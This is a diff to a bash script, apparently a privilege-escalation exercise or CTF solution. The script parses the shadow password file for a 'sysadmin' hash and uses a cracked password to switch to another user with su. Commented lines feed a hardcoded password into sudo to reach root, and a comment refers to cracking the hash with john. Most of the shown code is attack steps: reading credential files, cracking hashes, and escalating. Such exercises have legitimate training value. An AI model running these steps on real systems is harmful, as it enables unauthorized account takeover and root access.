@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
 
+ temp_password="correctbatteryhorsestaple99"
+
 # Parse the shadow password file
  while IFS= read -r line; do
 	if [ "${line:0:8}" = "sysadmin" ]; then
@@ -16,9 +18,13 @@
  #$(<temp.txt)
  echo $yourboss_cracked
 
- whoami
+ su -c "whoami" - yourboss
 
-# echo "$yourboss_cracked" | su yourboss -S -c "whoami"
+# whoami
+# echo "$temp_password" | sudo -s <<EOF
+# echo Now I am root
+# whoami
+#EOF
  
 # Crack the sysadmin's password using john
 # ./format_password.py "$sysadmin_hash" > temp_hash.txt
